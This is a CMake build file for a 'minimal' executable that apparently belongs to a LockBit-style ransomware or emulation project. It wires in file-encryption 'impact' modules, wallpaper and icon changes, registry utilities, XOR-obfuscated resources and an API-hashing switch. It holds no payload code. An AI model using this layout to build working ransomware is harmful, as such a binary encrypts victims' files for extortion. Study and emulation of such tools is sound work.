###############################################################################
# Minimal executable
###############################################################################
add_executable(
    minimal
    "minimal_main.cpp"
    
    "../common/config/config.cpp"
    "../common/crypto/encryption.cpp"
    "../common/crypto/djb2.cpp"
    "../common/crypto/xor.cpp"
    "../common/enumerate.cpp"
    "../common/impact/encryption.cpp"
    "../common/impact/icon.cpp"
    "../common/impact/wallpaper.cpp"
    "../common/util/logger.cpp"
    "../common/util/os_utils.cpp"
    "../common/util/registry.cpp"
    "../common/util/resource_util.cpp"
    "../common/util/string_utils.cpp"

    "../common/config/config.rc"
    "../common/impact/icon.rc"
    "../common/impact/wallpaper.rc"
)
add_custom_command(TARGET minimal POST_BUILD COMMAND echo minimal target built with CMAKE_CXX flags: ${CMAKE_CXX_FLAGS})
target_include_directories(minimal PUBLIC "${CMAKE_SOURCE_DIR}/include")

target_link_libraries(
    minimal 
    PRIVATE
    Bcrypt.lib
)

if (LOCKBIT_DEBUG_LOGGING)
    message(STATUS "[LockBit] Enabling debug logging for minimal target")
    add_compile_definitions(DEBUG_LOGGING=1)
endif()
unset(LOCKBIT_DEBUG_LOGGING CACHE)

target_compile_definitions(
    minimal
    PUBLIC
    CONFIG_PATH="${ConfigResourcePathXor}"
    FILE_ICON_PATH="${IconResourcePathXor}"
    WALLPAPER_PATH="${WallpaperResourcePathXor}"
    RESOURCE_XOR_KEY_STR="${ResourceXorKeyHex}"
    NO_WIN_API_HASHING=true
    $<$<CONFIG:Debug>:DEBUG>
)
